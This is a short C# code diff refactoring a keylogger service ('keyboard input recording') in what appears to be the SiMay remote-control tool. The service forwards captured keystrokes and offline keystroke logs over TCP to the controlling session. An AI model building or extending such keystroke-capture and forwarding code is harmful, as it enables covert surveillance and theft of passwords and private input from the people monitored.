@@ -1,20 +1,20 @@
 ﻿using SiMay.Core;
 using SiMay.Core.PacketModelBinder.Attributes;
-using SiMay.Core.PacketModelBinding;
-using SiMay.Core.Packets;
 using SiMay.ServiceCore.Attributes;
-using SiMay.ServiceCore.Extensions;
-using SiMay.Sockets.Tcp;
 using SiMay.Sockets.Tcp.Session;
-using System;
 
-namespace SiMay.ServiceCore.ApplicationService
+namespace SiMay.ServiceCore
 {
     [ServiceName("键盘输入记录")]
     [ServiceKey("RemoteKeyboradJob")]
-    public class KeyboardService : ServiceManagerBase
+    public class KeyboardService : ApplicationRemoteService
     {
         private Keyboard _keyboard;
+        public override void SessionInited(TcpSocketSaeaSession session)
+        {
+
+        }
+
         public override void SessionClosed()
         {
             if (_keyboard != null)
@@ -32,7 +32,7 @@ namespace SiMay.ServiceCore.ApplicationService
         [PacketHandler(MessageHead.S_KEYBOARD_GET_OFFLINEFILE)]
         public void SendOffLineRecord(TcpSocketSaeaSession session)
         {
-            SendAsyncToServer(MessageHead.C_KEYBOARD_OFFLINEFILE,
+            SendTo(CurrentSession, MessageHead.C_KEYBOARD_OFFLINEFILE,
                 _keyboard.GetOfflineRecord());
         }
 
@@ -56,7 +56,7 @@ namespace SiMay.ServiceCore.ApplicationService
                     break;
 
                 case Keyboard.KeyboardHookEvent.Data:
-                    SendAsyncToServer(MessageHead.C_KEYBOARD_DATA, key);
+                    SendTo(CurrentSession, MessageHead.C_KEYBOARD_DATA, key);
                     break;
             }
         }
